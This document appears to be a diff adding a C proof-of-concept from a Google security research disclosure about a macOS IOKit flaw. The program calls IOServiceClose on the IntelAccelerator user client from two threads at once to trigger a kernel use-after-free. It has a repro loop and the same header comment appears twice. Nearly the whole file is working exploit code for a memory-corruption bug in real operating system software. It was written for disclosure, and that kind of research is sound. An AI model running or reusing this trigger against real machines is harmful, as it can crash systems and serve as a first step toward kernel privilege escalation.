@@ -1,0 +1,95 @@
+/*
+Source: https://code.google.com/p/google-security-research/issues/detail?id=597
+
+It turns out that the spoofed no-more-senders notification bug when applied to iokit objects
+was actually just a more complicated way to hit ::clientClose in parallel. We can in fact
+do this very simply by calling IOServiceClose on two threads :)
+
+Like the spoofed notifications this leads to many bugs in many userclients, the exact nature
+of which depends on the semantics of the clientClose implementation.
+
+In this particular case we hit a kernel UaF.
+
+Tested on El Capitan 10.10.1 15b42 on MacBookAir 5,2
+
+repro: while true; do ./ioparallel_close; done
+*/
+
+// ianbeer
+
+// clang -o ioparallel_close ioparallel_close.c -lpthread -framework IOKit
+/*
+io_service_close leads to potentially dangerous IOKit methods being called without locks
+
+It turns out that the spoofed no-more-senders notification bug when applied to iokit objects
+was actually just a more complicated way to hit ::clientClose in parallel. We can in fact
+do this very simply by calling IOServiceClose on two threads :)
+
+Like the spoofed notifications this leads to many bugs in many userclients, the exact nature
+of which depends on the semantics of the clientClose implementation.
+
+In this particular case we hit a kernel UaF.
+
+Tested on El Capitan 10.10.1 15b42 on MacBookAir 5,2
+
+repro: while true; do ./ioparallel_close; done
+*/ 
+
+#include <stdio.h>
+#include <stdlib.h>
+
+#include <mach/mach.h>
+#include <mach/thread_act.h>
+
+#include <pthread.h>
+#include <unistd.h>
+
+#include <IOKit/IOKitLib.h>
+
+io_connect_t conn = MACH_PORT_NULL;
+
+int start = 0;
+
+void close_it(io_connect_t conn) {
+  IOServiceClose(conn);
+}
+
+void go(void* arg){
+
+  while(start == 0){;}
+
+  usleep(1);
+
+  close_it(*(io_connect_t*)arg);
+}
+
+int main(int argc, char** argv) {
+  char* service_name = "IntelAccelerator";
+  int client_type = 4;
+
+  io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching(service_name));
+  if (service == MACH_PORT_NULL) {
+    printf("can't find service\n");
+    return 0;
+  }
+
+  IOServiceOpen(service, mach_task_self(), client_type, &conn);
+  if (conn == MACH_PORT_NULL) {
+    printf("can't connect to service\n");
+    return 0;
+  }
+
+  pthread_t t;
+  io_connect_t arg = conn;
+  pthread_create(&t, NULL, (void*) go, (void*) &arg);
+
+  usleep(100000);
+
+  start = 1;
+
+  close_it(conn);
+
+  pthread_join(t, NULL);
+
+  return 0;
+}
